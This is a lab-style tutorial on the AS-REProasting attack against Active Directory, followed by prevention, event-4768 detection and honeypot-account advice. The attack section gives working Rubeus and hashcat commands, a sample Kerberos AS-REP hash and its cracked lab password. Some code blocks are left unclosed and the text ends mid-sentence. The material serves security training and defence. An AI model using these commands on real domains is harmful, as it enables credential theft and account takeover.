# AS-REProasting

## Description

The `AS-REProasting` attack is similar to the `Kerberoasting` attack; we can obtain crackable hashes for user accounts that have the property `Do not require Kerberos preauthentication` enabled. The success of this attack depends on the strength of the user account password that we will crack.

---

## Attack

To obtain **crackable hashes**, we can use `Rubeus` again. However, this time, we will use the `asreproast` action. If we don't specify a name, `Rubeus` will extract **hashes for each user that has** `Kerberos preauthentication` **not required**:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      | |

Once `Rubeus` **obtains the hash** for the user `Anni` *(the only one in the playground environment with preauthentication not required)*, we will move the output text file to a linux attacking machine.

For `hashcat` to be able **to recognize the hash**, we need to edit it by adding `23$` after `$krb5asrep$`:

```txt
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```

We can now use `hashcat` with the hash-mode (option `-m`) `18200` for `AS-REPRoastable hashes`. We also pass a dictionary file with passwords *(the file `passwords.txt`)* and save the output of any successfully cracked tickets to the file `asrepcracked.txt`:

```bash
trustinveritas@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force

Once `hashcat` cracks the password, we can print the contents of the output file to obtain the cleartext password `Slavi123`:

```bash
trustinveritas@htb[/htb]$ sudo cat asrepcrack.txt

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123

## Prevention

As mentioned before, the **success of this attack depends on the strength of the password of users** with `Do not require Kerberos preauthentication` configured.

First and foremost, **we should only use this property if needed**; a good practice is to `review accounts quarterly` to ensure that we have **not assigned this property**. Because **this property is often found** with some **regular user accounts**, they tend to have `easier-to-crack passwords than service accounts with SPNs` *(those from Kerberoast)*. Therefore, **for users requiring this configured**, we should `assign a separate password policy`, which **requires at least 20 characters** to thwart cracking attempts.

---

## Detection

When we executed Rubeus, an [Event with ID 4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) was generated, `signaling that a Kerberos Authentication ticket` was generated:

![Event-4768](img/Event-4768.png)

The caveat is that **AD generates this event for every user that authenticates with Kerberos to any device**; therefore, the presence of this event is very abundant. However, it is possible to know where the user authenticated from, which we can then use to `correlate known good logins against potential malicious hash extractions`. It may be hard to inspect **specific IP addresses**, especially if a **user moves around office locations**. However, it is possible to scrutinize the particular `VLAN` and **alert on anything outside it**.

---

## Honeypot üçØ

For this attack, a `honeypot user` is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that **no login attempts are performed regularly**. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.

However, suppose the honeypot user is the only account with `Kerberos Pre-Authentication not required`. In that case, there might be better detection methods, as it would be very obvious for advanced threat actors that it is a honeypot user, resulting in them avoiding interactions with it. *(I did previously hear from an organization that needed one of these accounts (application related) that the `security through obscurity` behind having only one of these accounts may save them, as attackers will avoid going after it thinking it is a honeypot user. While it may be true in some instances, we should not let a glimpse of hope dictate the security state of the environment.)*

To make **a good honeypot user**, we should ensure the following:

- The account must be **a relatively old user**, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).

- For `a service account user`, the **password should ideally be over two years old**. For `regular users`, **maintain the password** so it does not **become older than one year**.

- The **account must have logins after the day the password was changed**; otherwise, it becomes self-evident if the last password change day is the same as the previous login.

- The account must have **some privileges assigned to it**; otherwise, it won't be interesting to try to crack its password's hash.

If we go back to our playground environment and configure the user `svc-iam` *(presumably an old IAM account leftover)* with the recommendations above, then **any request to obtain a** `TGT` **for that account should be alerted on**. The event received would look like this:
